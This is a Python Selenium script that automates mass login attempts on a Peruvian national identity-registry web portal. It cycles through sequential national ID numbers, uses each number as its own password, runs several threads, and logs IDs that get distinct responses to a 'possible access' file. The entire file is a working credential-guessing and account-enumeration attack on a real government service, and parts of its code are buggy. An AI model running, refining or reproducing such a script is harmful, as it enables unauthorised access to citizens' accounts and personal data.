from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
from selenium.common.exceptions import NoSuchElementException
from os import system
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.common.exceptions import WebDriverException

#from concurrent.futures import ThreadPoolExecutor
from threading import Thread, Barrier
from requests import get
from selenium.webdriver.firefox.options import Options
import telegram
from colorama import init,Fore,Back,Style
#from io import open

pathBotonIngresar = '/html/body/div[1]/div/div/div[1]/div/div[1]/div[3]/div/div[1]/index1/div/div/div/div[3]/div/a'

path_ventanaError = '/html/body/div[2]/div/div/div[2]'
path_ventanaError2 = '/html/body/div[3]/div/div/div[2]'

path_mensajeError= '/html/body/div[2]/div/div/div[2]/p'
path_mensajeError2= '/html/body/div[3]/div/div/div[2]/p'

pathCerrarbtn = '/html/body/div[2]/div/div/div[3]/button'
pathCerrarbtn2 ='/html/body/div[3]/div/div/div[3]/a/button'

pathCerrarVentana = '/html/body/div[3]/div/div/div[1]/button/span'

def func():
    #global driver
    firefox_options = Options()
    #firefox_options.add_argument("--headless")
    #firefox_options.add_argument("--start-maximized")
    driver = webdriver.Firefox(executable_path = "geckodriver.exe", options = firefox_options)
    driver.get(url) 
    print(driver)

    global num
    vacio = "0"
    textClave = ''
    #print(num)
    while (True):
        wait0 = WebDriverWait(driver,10)
        driver.find_element(By.ID,'nuDni').send_keys(num)
        driver.find_element(By.ID,'npass').send_keys(num)
        driver.execute_script(f'document.getElementById("npass").type={vacio};')
        wait0.until(EC.visibility_of_element_located((By.XPATH,pathBotonIngresar)))
        driver.find_element(By.XPATH,pathBotonIngresar).click()
        
        try:
            try:
                wait0.until(EC.visibility_of_element_located((By.XPATH,path_ventanaError)))
                p = driver.find_element(By.XPATH,path_mensajeError).text

                driver.find_element(By.XPATH,pathCerrarbtn).click()
            except Exception as e:
                print(Fore.RED)
                wait0.until(EC.visibility_of_element_located((By.XPATH,path_ventanaError2))) #esperando ventana roja
                p = driver.find_element(By.XPATH,path_mensajeError2).text
                
                driver.find_element(By.XPATH,pathCerrarVentana).click()
                driver.execute_script(f'document.getElementById("nuDni").value = "{textClave}";')
                driver.execute_script(f'document.getElementById("npass").value = "{textClave}";')

                posibles = open("posiblesacces.txt","a")
                posibles.write(str(num), p.strip())
                posibles.write("\n")
                posibles.close()
                time.sleep(1)
        except Exception as e:
            print("Saliendo pipipipi")
            break
        print(Fore.CYAN)
        if "textoModal" in p:
            break
        print(num," | ",p)
        num = num + 1

def funcionUnida():
    func()
    #while(True):
     #   accion()
#-----------------------------------------------

init()
print(Fore.CYAN)
url = "https://cel.reniec.gob.pe/celweb/index.html"
#numero_multi = 2
numero_multi = input("Workesr: ")
threads = []

pe = True
num = 12369347


for _ in range (int(numero_multi)):
    i = Thread(target=funcionUnida)
    threads.append(i)
    i.start()     

for i in threads:
    i.join()




